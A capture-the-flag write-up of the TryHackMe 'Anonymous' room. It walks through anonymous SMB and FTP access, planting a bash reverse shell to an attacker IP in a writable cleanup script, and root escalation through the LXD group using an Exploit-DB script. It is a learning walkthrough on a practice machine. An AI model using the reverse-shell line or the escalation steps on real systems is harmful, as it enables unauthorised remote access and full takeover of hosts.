---
title: Writeup - THM - Anonymous
date: 2020-09-27 23:14:00 +0100
description: "Walkthrough of Anonymous of TryHackme"
categories: [Hacking, CTF]
tags: [TryHackeMe, Anonymous, Hacking, pwned]
author: Fr3akazo1d!
image: /assets/img/thm-images/THM-Anonymous.png
---

# General Information

| Room        | Date        | Difficulty | Tags                               | Time |
| ----------- | ----------- | ---------- | ---------------------------------- | ---- |
| Anonymous    | 27.09.2020  | Medium       | Security, linux, permissions, medium | 2h   |


# Used Programs

| Program  | Command |
| --------- | -------- |
| rustscan | rustscan $ip --ulimit 5000 -- -sC -sV -oN nmap/initial  tee output |
| smbclient | smbclient -L 10.10.195.20 | 
| ftp |ftp 10.10.195.20 |

# TryHackMe - Answers:

--- 

## 1 Enumerate the machine. How many ports are open?
```
4
```
## 2 What service is running on port 21?
```
ftp
```
## 3 What service is running on ports 139 and 445?
```
smb
```
## 4 There’s a share on the user’s computer. What’s it called?
```
pics
```
## 5 user.txt
```
9******************************0
```

## 6 root.txt
```
4******************************3
```

---

# Walkthrough: 

The first thing i always do is a NMAP-Scan on the target machine. 
I used the Program "Rustscan".

The rustscan command which i used was:
```sh
rustscan 10.10.195.20 | tee rustscan-output.txt
```

Below the output of the Rustscan.

```sh
File: rustscan-output.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
   2   │ | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
   3   │ | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
   4   │ `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
   5   │ Faster Nmap scanning with Rust.
   6   │ ________________________________________
   7   │ : https://discord.gg/GFrQsGy           :
   8   │ : https://github.com/RustScan/RustScan :
   9   │  --------------------------------------
  10   │ 🌍HACK THE PLANET🌍
  11   │ 
  12   │ [~] The config file is expected to be at "/home/fr3akazo1d/.rustscan.toml"
  13   │ [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive s
       │ ervers
  14   │ [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the
       │  Ulimit with '--ulimit 5000'. 
  15   │ Open 10.10.195.20:21
  16   │ Open 10.10.195.20:139
  17   │ Open 10.10.195.20:22
  18   │ Open 10.10.195.20:445
  19   │ [~] Starting Nmap
  20   │ [>] The Nmap command to be run is nmap -vvv -p 21,139,22,445 10.10.195.20
  21   │ 
  22   │ Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 21:18 CEST
  23   │ Initiating Ping Scan at 21:18
  24   │ Scanning 10.10.195.20 [2 ports]
  25   │ Completed Ping Scan at 21:18, 0.08s elapsed (1 total hosts)
  26   │ Initiating Parallel DNS resolution of 1 host. at 21:18
  27   │ Completed Parallel DNS resolution of 1 host. at 21:18, 0.03s elapsed
  28   │ DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
  29   │ Initiating Connect Scan at 21:18
  30   │ Scanning 10.10.195.20 [4 ports]
  31   │ Discovered open port 139/tcp on 10.10.195.20
  32   │ Discovered open port 445/tcp on 10.10.195.20
  33   │ Discovered open port 22/tcp on 10.10.195.20
  34   │ Discovered open port 21/tcp on 10.10.195.20
  35   │ Completed Connect Scan at 21:18, 0.07s elapsed (4 total ports)
  36   │ Nmap scan report for 10.10.195.20
  37   │ Host is up, received conn-refused (0.080s latency).
  38   │ Scanned at 2020-09-27 21:18:25 CEST for 0s
  39   │ 
  40   │ PORT    STATE SERVICE      REASON
  41   │ 21/tcp  open  ftp          syn-ack
  42   │ 22/tcp  open  ssh          syn-ack
  43   │ 139/tcp open  netbios-ssn  syn-ack
  44   │ 445/tcp open  microsoft-ds syn-ack
  45   │ 
  46   │ Read data files from: /usr/bin/../share/nmap
  47   │ Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

As in the output we can see, that we have 4 Ports open:

```sh
  40   │ PORT    STATE SERVICE      REASON
  41   │ 21/tcp  open  ftp          syn-ack
  42   │ 22/tcp  open  ssh          syn-ack
  43   │ 139/tcp open  netbios-ssn  syn-ack
  44   │ 445/tcp open  microsoft-ds syn-ack
```

## Enumerate SMB-Share

The first Port i have explored was 139/445 SMB. 
With the command "smbclient -L 10.10.195.20" we enummerate the services witch a available on the server. 

```
-L|--list
This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you are trying to reach a host on another network.
```

This give us this Infromation:
```sh
smbclient -L 10.10.195.20
Enter WORKGROUP\fr3akazo1d's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

With this infromation, i tried to connect to the "pics" share on the server. 

```sh
smbclient \\\\10.10.195.20\\pics
Enter WORKGROUP\fr3akazo1d's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 13:11:34 2020
  ..                                  D        0  Sun Sep 27 21:48:54 2020
  corgo2.jpg                          N    42663  Tue May 12 02:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 02:43:42 2020

		20508240 blocks of size 1024. 13289716 blocks available
smb: \>
copied the files to my local machine:

smb: \> get corog2.jpg
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \corog2.jpg
smb: \> get corgo2.jpg
getting file \corgo2.jpg of size 42663 as corgo2.jpg (94.9 KiloBytes/sec) (average 94.9 KiloBytes/sec)
smb: \> get puppos.jpeg
getting file \puppos.jpeg of size 265188 as puppos.jpeg (315.1 KiloBytes/sec) (average 238.4 KiloBytes/sec)
smb: \> 
```

This connection was successfully. The connection was done without any password and username. 
Analyzed the two files with steghide. there are some files behind. but i don’t get the passphrase for the files.
These are only pictures of dogs...

## Enumerate FTP-Share

The next step was to enumerate the FTP-Share. Maybe we have better luck on this Server.

I tried the "anonymous" login on the FTP-Share. 

```sh
ftp 10.10.195.20
Connected to 10.10.195.20.
220 NamelessOne's FTP Server!
Name (10.10.195.20:fr3akazo1d): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
lets check what is on this ftp share:

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
tp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          364 Sep 27 19:39 clean.sh
-rw-rw-r--    1 1000     1000         4257 Sep 27 20:24 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
```

Anonymous login was successfully so i have checked the files on the FTP-Share. In the folder "scripts" there are three files listed. 

1. clean.sh
2. removed_files.log
3. to_do.txt

Lets check out what is in this files:

clean.sh
```sh
bat clean.sh         
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: clean.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/bash
   2   │ 
   3   │ tmp_files=0
   4   │ echo $tmp_files
   5   │ if [ $tmp_files=0 ]
   6   │ then
   7   │         echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
   9   │ else
  10   │     for LINE in $tmp_files; do
  11   │         rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files
       │ .log;done
  12   │ fi
```

So this file is interessting because, this is somehow removing some files on the target machine. 
Maybe we can change the code in the file an rerun the scirpt on the target. 

removed_files.log
```sh 
bat removed_files.log 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: removed_files.log
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Running cleanup script:  nothing to delete
   2   │ Running cleanup script:  nothing to delete
   3   │ Running cleanup script:  nothing to delete
   4   │ Running cleanup script:  nothing to delete
   5   │ Running cleanup script:  nothing to delete
   6   │ Running cleanup script:  nothing to delete
   7   │ Running cleanup script:  nothing to delete
   8   │ Running cleanup script:  nothing to delete
   9   │ Running cleanup script:  nothing to delete
   ....
```

This is only a log file, when some files are removed it will stored in this file. 


to_do.txt
```sh
bat to_do.txt        
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: to_do.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ I really need to disable the anonymous login...it's really not safe
```

Ok, yes, the anonymous login should be removed from the FTP-Server. Something bad can happend. :)

Now lets focus on the "clean.sh" Maybe we can add a reverse shell in the bash script. 
We cann add a bash reverse-shell into the file. 

Found on Pentest-Monkey a reverse-shell witch should work:

[Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet "Reverse-Shell")

Added the code in line 8 of the "clean.sh" script. 
Change the IP-Address to my local address and a port. 

```sh
bat clean.sh         
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: clean.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/bash
   2   │ 
   3   │ tmp_files=0
   4   │ echo $tmp_files
   5   │ if [ $tmp_files=0 ]
   6   │ then
   7   │         echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
   8   │         bash -i >& /dev/tcp/1*.1*.3.1**/8080 0>&1
   9   │ else
  10   │     for LINE in $tmp_files; do
  11   │         rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files
       │ .log;done
  12   │ fi
```

In another terminal i started a Netcat Listener on port 8080: "nc -lnvp 8080"

```sh
nc -lnvp 8080
listening on [any] 8080 ...
```
and after a few seconds i got a shell on the target:

```sh
nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.11.3.139] from (UNKNOWN) [10.10.195.20] 53182
bash: cannot set terminal process group (2584): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$
```

In this shell we can now read the User-flag. 

```sh
namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
9******************************0
```

So half way done on the target. Now we want root access on the client. :)

## Privilage-Escalation

For my Privilage-Escalation i exploit the LXD-Vulnerability on the target. 

```sh
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
The command "id" shows me that the user is in the LXD-Group. LXD is a container software manager. Its like Doker. 

There is a Vulnerability of the LXD-Container:

[Exploit-DB-LXD-Vulnerability](https://www.exploit-db.com/exploits/46978)

For the Exploitation i followed the steps in the Command section of the file: 
```sh
# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine
```

When this steps are done we can now run the script on the target:

```sh
namelessone@anonymous:~$ ./get-root.sh -f alpine-v3.12-x86_64-20200927_2146.tar.gz
<root.sh -f alpine-v3.12-x86_64-20200927_2146.tar.gz
Image imported with fingerprint: e35751259917ef3b79e8aac7a30a93178e6da525f5b4cf76bef49452d5d09997
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| alpine | e35751259917 | no     | alpine v3.12 (20200927_21:46) | x86_64 | 3.05MB | Sep 27, 2020 at 8:40pm (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
Creating privesc
Device giveMeRoot added to privesc
```

Let's check if we are root with the command "id": 
```sh
id
uid=0(root) gid=0(root)
```

In this Vulnerability. The Exploit is loading a Container and is mounting the /root folder to the mounting path "/mnt/root/".

In this path we can now check the root-flag of the target.

```sh
cd /mnt/root/root
pwd
/mnt/root/root
ls
root.txt
cat root.txt
4******************************3
```

Now we have the root-flag and we have pwned the machine.

# Summary:

This room was interessting, because of the change of the script witch is running on the target for getting a reverse shell.

When i got the first shell on the target, the Priv-Escalation was straight forward. With LXD it was no new stuff.
